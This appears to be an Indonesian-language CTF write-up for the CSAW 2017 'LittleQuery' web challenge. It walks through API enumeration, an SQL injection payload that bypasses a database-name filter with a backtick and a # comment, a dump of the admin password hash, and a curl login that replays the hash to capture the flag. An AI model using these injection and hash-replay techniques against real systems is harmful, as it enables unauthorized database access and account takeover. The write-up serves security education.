---
private: 'false'
layout: post
featured: false
published: true
comments: true
modified: 2017-09-18
date: 2017-09-18
title: 'CSAW CTF 2017: LittleQuery - 200'
tags: [csaw2017,Web Exploitation]
mathjax: false
imagefeature: 
description: Writeup CSAW 2017 LittleQuery - 200
category: CTF
chart: null
---


## Problems

```
LittleQuery
I've got a new website for BIG DATA analytics!

http://littlequery.chal.csaw.io
```


## POC

Di source code pada halaman index kita bisa menemukan ada source yang di comment

```html

<!--
<div class="col-md-4">
    <h2>For Developers</h2>
    <p>Check out our <a href="/api/db_explore.php">API</a></p>
</div>
-->
```


kita bisa melakukan explore terhadap database mereka menggunakan api yang tersedia,
ada 2 mode untuk mengexplor databasenya yaitu `mode={schema|preview}` schema untuk melihat schema dari
table atau database.

so kita gunakan schema `http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema` untuk melakukan
list available databases ditemukan ada database namanya `littlequery`, kemudian list table apa saja yang 
ada pada database littlequery `http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&db=littlequery`
so kita dapat ada table `user`

```javascript

{
    tables: [
        "user"
    ]
}
```

kemudian untuk melakukan list kolom pada table user gunakan `http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&db=littlequery&table=user`
dan di dapatkan

```javascript

{
    columns: {
        uid: "int(11)",
        username: "varchar(128)",
        password: "varchar(40)"
    }
}
```

untuk melakukan dump datanya kita bisa gunakan mode preview ke `http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=littlequery&table=user`
tapi ternyata ada filter yang melarang untuk melakukan preview terhadap database `littlequery`

setelah mencoba menlakukan injek terhadap parameter db dan table kita bisa memanipulasi parameter db sehingga
tidak match dengan == "littlequery" kita bisa menggunakan # sebagai comment

illustrasi kodingan yang digunakan adalah sebagai berikut

```php

$db = addslashes($_GET['db']);
$table = addslashes($_GET['table']);

if($db == "littlequery"){
    die("Deny");
}

$query = "SELECT * from `".$db."`.".$table."`";
```

kita bisa melakukan bypass dengan menggunakan payload sebagai berikut:

```
http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=littlequery`.`user`%23&table=foobar`
```

$query akan jadi seperti berikut 

```php

SELECT * from `littlequery`.`user`#`.`foobar`

//query yang tereksekusi adalah => SELECT * from `littlequery`.`user`

$db = "littlequery`.`user`#" // jadi kita gak kena deny lagi
```

didapatkan user dan password yang di hash 

```javascript

[
    {
        uid: "1",
        username: "admin",
        password: "5896e92d38ee883cc09ad6f88df4934f6b074cf8"
    }
]
```

kita tidak harus mencari plain-text dari SHA-1 tersebut karena website tersebut menerima login dengan
hashed password bukan dengan plaintext password diketahui dari script yang ada di login.js

```javascript

$(".form-signin").submit(function () {
    var $password = $(this).find("input[type=password]");
    $password.val(CryptoJS.SHA1($password.val()).toString());
});
```

kita bisa kirim POST data dengan curl `curl -X POST http://littlequery.chal.csaw.io/login.php --data "username=admin&password=5896e92d38ee883cc09ad6f88df4934f6b074cf8" -v`
ambil cookie yang di kirimkan response `Set-Cookie: PHPSESSID=6cidmmh[...]cd63qr9nhgb7; path=/` kemudian
set cookie ke browser kalian untuk berpindah ke state login dan bisa akses ke `/query.php`


di temukan flag `flag{mayb3_1ts_t1m3_4_real_real_escape_string?}`

![Flag](https://cdn.pbrd.co/images/GKSIR6m.png)